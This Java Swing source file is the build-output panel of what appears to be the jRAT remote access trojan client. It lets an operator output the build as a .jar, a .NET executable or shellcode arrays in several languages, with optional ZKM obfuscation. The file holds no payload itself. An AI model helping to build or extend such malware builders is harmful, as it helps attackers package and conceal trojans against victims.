package io.jrat.client.ui.panels;

import io.jrat.client.Help;
import io.jrat.client.ShellcodeGenerator;
import io.jrat.client.ui.frames.FrameExecutableInfo;
import io.jrat.client.ui.frames.FrameObfuscationInfo;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;

import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.LayoutStyle.ComponentPlacement;


@SuppressWarnings("serial")
public class PanelBuildOutput extends JPanel {

	public FrameExecutableInfo frameExecutableInfo = new FrameExecutableInfo();
	public FrameObfuscationInfo frameObfuscationInfo = new FrameObfuscationInfo();
	
	private final ButtonGroup buttonGroup = new ButtonGroup();
	private final ButtonGroup buttonGroup_1 = new ButtonGroup();
	private JRadioButton rdbtnShellcode;
	private JRadioButton rdbtnjarjavaArchive;
	private JRadioButton rdbtnCcArray;
	private JRadioButton rdbtnPythonArray;
	private JRadioButton rdbtnDelphiArray;
	private JRadioButton rdbtnJavaArray;
	private JRadioButton rdbtnCArray;
	private JRadioButton rdbtnexenetExecutable;
	private JButton btnAssemblyInfo;
	private JCheckBox chckbxObfuscate;
	private JButton btnObfuscationInfo;

	public boolean useShellcode() {
		return rdbtnShellcode.isSelected();
	}

	public boolean useExe() {
		return rdbtnexenetExecutable.isSelected();
	}

	public int getShellcode() {
		if (!useShellcode()) {
			return -1;
		}
		if (rdbtnCcArray.isSelected()) {
			return ShellcodeGenerator.CCPP;
		} else if (rdbtnPythonArray.isSelected()) {
			return ShellcodeGenerator.PYTHON;
		} else if (rdbtnDelphiArray.isSelected()) {
			return ShellcodeGenerator.DELPHI;
		} else if (rdbtnJavaArray.isSelected()) {
			return ShellcodeGenerator.JAVA;
		} else if (rdbtnCArray.isSelected()) {
			return ShellcodeGenerator.CSHARP;
		} else {
			return -1;
		}
	}
	
	public boolean obfuscate() {
		return chckbxObfuscate.isSelected();
	}

	public PanelBuildOutput() {

		rdbtnjarjavaArchive = new JRadioButton(".jar (Java Archive)");
		rdbtnjarjavaArchive.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JRadioButton btn = (JRadioButton) arg0.getSource();
				boolean b = !btn.isSelected();
				rdbtnCcArray.setEnabled(b);
				rdbtnPythonArray.setEnabled(b);
				rdbtnDelphiArray.setEnabled(b);
				rdbtnJavaArray.setEnabled(b);
				rdbtnCArray.setEnabled(b);
			}
		});
		buttonGroup.add(rdbtnjarjavaArchive);
		rdbtnjarjavaArchive.setSelected(true);

		rdbtnShellcode = new JRadioButton("Shellcode");
		rdbtnShellcode.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JRadioButton btn = (JRadioButton) arg0.getSource();
				boolean b = btn.isSelected();
				rdbtnCcArray.setEnabled(b);
				rdbtnPythonArray.setEnabled(b);
				rdbtnDelphiArray.setEnabled(b);
				rdbtnJavaArray.setEnabled(b);
				rdbtnCArray.setEnabled(b);
			}
		});
		buttonGroup.add(rdbtnShellcode);

		rdbtnCcArray = new JRadioButton("C/C++ Array");
		rdbtnCcArray.setEnabled(false);
		buttonGroup_1.add(rdbtnCcArray);

		rdbtnPythonArray = new JRadioButton("Python Array");
		rdbtnPythonArray.setEnabled(false);
		buttonGroup_1.add(rdbtnPythonArray);

		rdbtnJavaArray = new JRadioButton("Java Array");
		rdbtnJavaArray.setEnabled(false);
		rdbtnJavaArray.setSelected(true);
		buttonGroup_1.add(rdbtnJavaArray);

		rdbtnDelphiArray = new JRadioButton("Delphi Array");
		rdbtnDelphiArray.setEnabled(false);
		buttonGroup_1.add(rdbtnDelphiArray);

		rdbtnCArray = new JRadioButton("C# Array");
		rdbtnCArray.setEnabled(false);
		buttonGroup_1.add(rdbtnCArray);

		btnAssemblyInfo = new JButton("Assembly Info");
		btnAssemblyInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				frameExecutableInfo.setVisible(true);
			}
		});

		rdbtnexenetExecutable = new JRadioButton(".exe (.NET executable)");
		buttonGroup.add(rdbtnexenetExecutable);

		JButton button = new JButton("?");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Help.help("Not recommended. Use third party tool instead.");
			}
		});
		
		btnObfuscationInfo = new JButton("Obfuscation");
		btnObfuscationInfo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				frameObfuscationInfo.setVisible(true);
			}
		});
		
		chckbxObfuscate = new JCheckBox("Obfuscate");
		
		File zkmDir = new File("files/zkm/");
		
		if (!zkmDir.exists()) {
			chckbxObfuscate.setEnabled(false);
			chckbxObfuscate.setText("No ZKM installation found in /files/zkm/");
			btnObfuscationInfo.setEnabled(false);
		}
		
		
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(37)
							.addComponent(rdbtnShellcode))
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(58)
							.addComponent(rdbtnCcArray))
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(58)
							.addComponent(rdbtnJavaArray))
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(58)
							.addComponent(rdbtnDelphiArray))
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(58)
							.addComponent(rdbtnCArray))
						.addGroup(groupLayout.createSequentialGroup()
							.addGap(37)
							.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
								.addComponent(rdbtnexenetExecutable)
								.addComponent(rdbtnjarjavaArchive))
							.addGap(4)
							.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
								.addComponent(btnAssemblyInfo)
								.addComponent(btnObfuscationInfo, GroupLayout.PREFERRED_SIZE, 101, GroupLayout.PREFERRED_SIZE))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
								.addComponent(chckbxObfuscate)
								.addComponent(button))))
					.addGap(90))
				.addGroup(groupLayout.createSequentialGroup()
					.addGap(58)
					.addComponent(rdbtnPythonArray)
					.addContainerGap(303, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addGap(54)
					.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
							.addComponent(rdbtnjarjavaArchive)
							.addComponent(chckbxObfuscate))
						.addComponent(btnObfuscationInfo))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(rdbtnexenetExecutable)
						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
							.addComponent(btnAssemblyInfo)
							.addComponent(button)))
					.addGap(3)
					.addComponent(rdbtnShellcode)
					.addGap(3)
					.addComponent(rdbtnCcArray)
					.addGap(3)
					.addComponent(rdbtnPythonArray)
					.addGap(3)
					.addComponent(rdbtnJavaArray)
					.addGap(3)
					.addComponent(rdbtnDelphiArray)
					.addGap(3)
					.addComponent(rdbtnCArray))
		);
		setLayout(groupLayout);

	}
}